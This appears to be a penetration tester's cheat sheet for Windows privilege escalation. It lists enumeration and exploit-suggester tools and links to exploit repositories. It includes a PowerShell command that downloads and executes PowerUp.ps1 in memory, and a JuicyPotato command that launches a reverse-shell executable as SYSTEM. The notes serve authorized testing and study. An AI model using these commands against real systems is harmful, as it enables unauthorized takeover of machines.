# Enumeration scripts
- winPEAS.exe/.bat https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- Seatbelt.exe (will not provide privesc vectors but only useful infos about the system for privesc)
- PowerUp.ps1 (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- SharpUp.exe (compiled C# version of PowerUp.ps1 => similar)
- Nishang.ps1 (?)
- powerless.bat (https://github.com/M4ximuss/Powerless)

### PowerUp.ps1 usage
powershell.exe iex (New-Object Net.Webclient).DownloadString('http://127.0.0.1/PowerUp.ps1')
(add "Invoke-AllChecks" at the end if you want to perform this function)

# Kernel exploits
- We can escalate from service account to SYSTEM (if SeImpersonatePrivilege or SeAssignPrimaryToken enabled) with juicy potato: **JuicyPotato.exe -l 4445 -p revshell_443_exe.exe -t \***
- Windows XP SP1: upnphost is vulnerable (see https://www.fuzzysecurity.com/tutorials/16.html)
- Windows 7/8/10(if not patched)/server 2008/server 2012: vulnerable to hot potato (potato.exe)

# Kernel exploits scripts
- windows_exploit_suggester.py (https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
- windows-privesc-check2.exe (https://github.com/pentestmonkey/windows-privesc-check)

### windows_exploit_suggester.py usage
- sudo pip install xlrd
- sudo python windows_exploit_suggester.py --update -> and note the database file name
- sudo updatedb && locate <database file name (previous output)>
Run windows_exploit_suggester.py on systeminfo:
- python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt

### wes.py usage
- python wes.py /tools/systeminfo.txt -i 'Elevation of Privilege' --exploits-only |more
- now check if the resulting CVEs are in the precompiled kernel exploits repository https://github.com/SecWiki/windows-kernel-exploits

# Tricks for kernel exploits
- If "sc" command doesn't work on the target try "sc.exe"
- Always transfer .exe in binary mode in ftp

# Manual commands references
- Manual_privesc_commands_list.sh (this is not a bash script but a list of commands)
- https://guif.re/windowseop
- https://www.fuzzysecurity.com/tutorials/16.html
- https://www.youtube.com/playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://www.fuzzysecurity.com/tutorials/16.html
